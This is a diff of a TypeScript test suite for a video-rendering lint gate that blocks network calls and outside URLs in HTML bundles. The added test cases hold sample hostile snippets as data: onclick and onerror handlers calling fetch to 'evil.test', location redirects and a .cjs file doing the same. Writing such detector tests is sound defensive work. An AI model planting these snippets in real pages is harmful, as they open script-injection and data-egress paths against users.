@@ -1,7 +1,9 @@
+import * as http from 'node:http';
 import * as path from 'node:path';
 import { lintProject } from '@hyperframes/lint';
 import { describe, expect, it } from 'vitest';
 import type { CheckIssue, RenderProjectBundle } from '@memberjunction/video-studio-core';
+import { HyperFramesRenderBackend } from '../hyperframes-backend.js';
 import {
     FakeRenderBackend,
     MJ_NETWORK_API_CODE,
@@ -34,7 +36,7 @@ describe('lint-gate static and HyperFrames lint checks', () => {
             '  <link rel="stylesheet" href="styles/app.css" />',
             '</head>',
             '<body>',
-            '  <div id="root" data-composition-id="main" data-duration="2" data-fps="30" data-width="1920" data-height="1080" data-no-timeline>',
+            '  <div id="root" data-composition-id="main" data-duration="2" data-fps="30" data-width="1920" data-height="1080">',
             '    <a href="#section-1">Jump</a>',
             '    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" />',
             '    <img src="blob:null/1234" />',
@@ -74,6 +76,7 @@ describe('lint-gate static and HyperFrames lint checks', () => {
         ['Inline JS dynamic import', '<script>import("https://evil.example.com/dyn.js");</script>'],
         ['Inline JS string literal URL', '<script>const u = "https://evil.example.com/api";</script>'],
         ['Relative path escaping bundle root', '<img src="../../outside.png" />'],
+        ['HTML event handler with entity-encoded URL', '<div onclick="fetch(&#34;https://evil.test&#34;)">x</div>'],
     ])('catches MJ_NON_BUNDLE_URL vector (%s) with BlockRender: true', async (_label, snippet) => {
         const bundle = makeBundleWithEntryContent(`<!doctype html><html><body>${snippet}</body></html>`);
         const staged = await StageRenderBundle(bundle, { InjectPreamble: false });
@@ -97,7 +100,12 @@ describe('lint-gate static and HyperFrames lint checks', () => {
         ['importScripts', '<script>importScripts("worker.js");</script>'],
         ['navigator.serviceWorker', '<script>navigator.serviceWorker.register("sw.js");</script>'],
         ['window.open', '<script>window.open("about:blank");</script>'],
-        ['location.href =', '<script>window.location.href = "/other";</script>'],
+        ['window.location.href =', '<script>window.location.href = "/other";</script>'],
+        ['bare location.href =', '<script>location.href = "https://evil.test";</script>'],
+        ['self.location =', '<script>self.location = "https://evil.test";</script>'],
+        ['top.location.replace()', '<script>top.location.replace("https://evil.test");</script>'],
+        ['HTML onerror fetch()', '<img src=x onerror="fetch(\'https://evil.test\')">'],
+        ['HTML onclick entity-decoded fetch()', '<div onclick="fetch(&#34;https://evil.test&#34;)"></div>'],
         ['meta refresh', '<meta http-equiv="refresh" content="0;url=index.html">'],
         ['base tag', '<base href="https://evil.example.com/">'],
         ['link rel=preconnect', '<link rel="preconnect" href="assets">'],
@@ -109,6 +117,21 @@ describe('lint-gate static and HyperFrames lint checks', () => {
             expect(result.BlockRender).toBe(true);
             expect(result.Passed).toBe(false);
             expect(result.Issues.some((i) => i.Code === MJ_NETWORK_API_CODE)).toBe(true);
+        } finally {
+            await staged.Cleanup();
+        }
+    });
+
+    it('scans non-standard script extensions such as .cjs for MJ_NETWORK_API and MJ_NON_BUNDLE_URL', async () => {
+        const bundle = makeBundleWithEntryContent('<!doctype html><html><body></body></html>', [
+            { Path: 'helper.cjs', Content: 'fetch("https://evil.test");' },
+        ]);
+        const staged = await StageRenderBundle(bundle, { InjectPreamble: false });
+        try {
+            const result = await RunLintGate(bundle, staged.RootDir, new FakeRenderBackend());
+            expect(result.BlockRender).toBe(true);
+            expect(result.Issues.some((i) => i.Code === MJ_NETWORK_API_CODE && i.File === 'helper.cjs')).toBe(true);
+            expect(result.Issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE && i.File === 'helper.cjs')).toBe(true);
         } finally {
             await staged.Cleanup();
         }
@@ -130,26 +153,47 @@ describe('lint-gate static and HyperFrames lint checks', () => {
         ]);
     });
 
-    it('runs @hyperframes/lint contract test on a real staged composition without launching a browser', async () => {
-        const validHtml = [
+    it('HyperFramesRenderBackend.Lint makes zero network requests on remote <video src> and normalizes issue.File to bundle-relative paths', async () => {
+        const hits: string[] = [];
+        const loopbackServer = http.createServer((req, res) => {
+            hits.push(req.url ?? '/');
+            res.writeHead(200);
+            res.end('ok');
+        });
+        await new Promise<void>((resolve) => loopbackServer.listen(0, '127.0.0.1', resolve));
+        const addr = loopbackServer.address();
+        const port = typeof addr === 'object' && addr ? addr.port : 0;
+
+        // Missing data-composition-id triggers a @hyperframes/lint diagnostic while <video src="http://..."> tests no-egress
+        const html = [
             '<!doctype html>',
             '<html>',
             '<body>',
-            '  <div id="root" data-composition-id="main" data-duration="2" data-fps="30" data-width="1920" data-height="1080" data-no-timeline>',
-            '    <h1>Hello</h1>',
-            '  </div>',
+            `  <video src="http://127.0.0.1:${port}/clip.mp4"></video>`,
             '</body>',
             '</html>',
         ].join('\n');
-        const bundle = makeBundleWithEntryContent(validHtml);
+        const bundle = makeBundleWithEntryContent(html);
         const staged = await StageRenderBundle(bundle, { InjectPreamble: false });
         try {
+            const hfBackend = new HyperFramesRenderBackend();
+            const lintOutcome = await hfBackend.Lint(staged.RootDir, 'index.html');
+            expect(hits).toEqual([]);
+            expect(lintOutcome.Issues.length).toBeGreaterThan(0);
+            for (const issue of lintOutcome.Issues) {
+                if (issue.File) {
+                    expect(issue.File).toBe('index.html');
+                    expect(issue.File.includes(staged.RootDir)).toBe(false);
+                }
+            }
+
             const report = await lintProject(staged.RootDir, path.join(staged.RootDir, 'index.html'), {
                 host: 'cli',
             });
-            expect(report.totalErrors).toBe(0);
+            expect(report.results.length).toBeGreaterThan(0);
         } finally {
             await staged.Cleanup();
+            await new Promise<void>((resolve) => loopbackServer.close(() => resolve()));
         }
     });
 });
